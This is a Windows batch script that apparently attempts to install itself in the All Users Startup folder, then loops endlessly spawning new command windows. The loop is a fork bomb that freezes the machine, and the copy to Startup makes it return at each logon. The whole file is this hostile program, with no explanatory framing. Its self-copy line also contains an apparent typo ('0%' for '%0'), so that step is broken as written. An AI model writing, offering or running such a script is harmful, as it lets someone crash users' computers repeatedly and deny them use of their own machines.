@echo off
copy 0% "%systemdrive%\Documents and Settings\All Users\Start Menu\Programs\Startup"
:loop
start
goto loop
